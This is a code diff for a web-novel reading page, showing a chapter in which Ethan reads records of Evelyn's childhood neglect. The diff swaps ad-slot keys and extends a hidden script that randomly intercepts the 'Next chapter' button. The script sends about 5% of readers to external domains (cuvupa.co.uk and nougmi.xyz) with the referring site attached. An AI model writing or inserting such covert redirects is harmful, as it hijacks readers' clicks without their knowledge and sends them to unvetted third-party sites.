@@ -2393,15 +2393,15 @@
                 <p>The little girl in the picture looked timid, her frail frame a stark contrast to the opulence of the Lowell mansion.</p>
                 <p>Ethan closed his eyes briefly.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>He picked up the documents again, fingers trembling.</p>
                 <p>Sophia Lowell&#39;s records showed she&#39;d been doted on since childhood, never experiencing abduction. But Evelyn&#39;s file was a knife twisting in his heart.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>At seven, Evelyn had gone missing for five days. Yet the Lowells took Brandon on vacation. When Evelyn returned alone—bruised and battered—she was met only with scolding.</p>
                 <p>&#34;Why didn&#39;t you just die out there?&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>The words exploded in Ethan&#39;s mind. His fist clenched violently, nails digging deep into his palm.</p>
                 <p>Records showed Evelyn had returned in a daze, prone to screaming fits. The family, unable to tolerate her distress, sent her to a psychiatric hospital.</p>
                 <!-- 广告位 5 -->
@@ -2410,7 +2410,7 @@
                 <p>&#34;Was it you...?&#34; he murmured. &#34;That little girl from back then...&#34;</p>
                 <p>Outside, dark clouds gathered. The rumble of distant thunder signaled an approaching storm.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
             </div>
             
             <div class="font-controls">
@@ -2532,7 +2532,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2548,8 +2548,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
